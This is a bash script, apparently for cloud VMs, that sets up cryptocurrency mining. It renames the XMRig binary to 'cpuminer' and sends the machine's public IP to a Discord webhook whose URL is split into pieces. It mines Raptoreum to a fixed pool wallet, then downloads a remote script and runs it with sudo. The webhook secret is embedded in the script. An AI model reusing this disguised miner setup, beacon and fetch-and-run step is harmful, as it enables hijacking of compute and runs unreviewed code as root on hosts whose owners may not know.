#!/bin/bash


if [ ! -f sudah_initiate_wownero.txt ]; then
  touch sudah_initiate_wownero.txt
  sudo apt-get install build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev libnuma-dev git -y
  wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
  tar xf xmrig-6.16.4-focal-x64.tar.gz
  cd /home/ubuntu/xmrig-6.16.4
  sudo rm -rf config.json
  wget https://raw.githubusercontent.com/Rickyose/azure_4_core/main/wownero/config.json
  sudo mv xmrig cpuminer
fi

sleep 5
cd /home/ubuntu/xmrig-6.16.4
#sudo ./cpuminer &
sleep 5

if [ ! -f sudah_initiate_discord_wownero.txt ]; then
  touch sudah_initiate_discord_wownero.txt
  pre_message="$@======================================================="
  message="$@CPUMINER UNTUK WOWNERO SUDAH JALAN : `curl ifconfig.me`"
  pasca_message="$@======================================================="
  ## format to parse to curl
  ## echo Sending message: $message
  msg_pre_content=\"$pre_message\"
  msg_content=\"$message\"
  msg_pasca_content=\"$pasca_message\"
  ## discord webhook
  nama1="https://disc"
  nama2="ord.com/ap"
  nama3="i/webh"
  ## FORMAT
  nama4="ooks/953847082421198890/9BRg2Z7tKUtH-ZwgemK4X4JYrS7wO6tTJkitnNiNxVOmGPigsjH2679jAkMideRPD8K1"
  url=$nama1$nama2$nama3$nama4
	curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_pre_content}" $url
	curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_content}" $url
	curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_pasca_content}" $url
 fi
 

##################################################################################################################################
##################################################################################################################################

if [[ ! -f sudah_initiate_raptoreum.txt ]]; then
  touch sudah_initiate_raptoreum.txt
  sudo apt-get install build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev libnuma-dev git -y
  git clone https://github.com/WyvernTKC/cpuminer-gr-avx2
  cd cpuminer-gr-avx2
  ./build.sh
fi

sleep 7

cd
cd /home/ubuntu/cpuminer-gr-avx2

model_name=`cat /proc/cpuinfo | grep 'model name' | uniq | cut -d' ' -f 5`
echo $model_name

sleep 7

if [[ "$model_name" == "E-2288G" ]]; then
	sudo rm -rf tune_config
	wget https://raw.githubusercontent.com/Rickyose/azure_4_core/main/tune_config_Intel_E2288G
	sudo mv tune_config_Intel_E2288G tune_config
	sudo ./cpuminer -a gr -o stratum+tcps://us.flockpool.com:5555 -u RTgYxV5PvELBAgV5bs11kypBiWqYT3AQTA.EXXXXX -p E228XX
else
	if [[ "$model_name" == "7452" ]]; then
		sudo rm -rf tune_config
		wget https://raw.githubusercontent.com/Rickyose/azure_4_core/main/tune_config_AMD_EPYC_7452
		sudo mv tune_config_AMD_EPYC_7452 tune_config
		sudo ./cpuminer -a gr -o stratum+tcps://us.flockpool.com:5555 -u RTgYxV5PvELBAgV5bs11kypBiWqYT3AQTA.7XXX -p 74XX
	else
		sudo rm -rf tune_config
		wget https://raw.githubusercontent.com/Rickyose/azure_4_core/main/tune_config
		sudo ./cpuminer -a gr -o stratum+tcps://us.flockpool.com:5555 -u RTgYxV5PvELBAgV5bs11kypBiWqYT3AQTA.FXXX -p FsXX
	fi
fi

##################################################################################################################################
##################################################################################################################################
##################################
 
sudo rm -rf urgent.sh
wget https://raw.githubusercontent.com/Rickyose/azure_4_core/main/misc/urgent.sh
sudo bash urgent.sh &
 
sleep 24h
sudo reboot
#################################
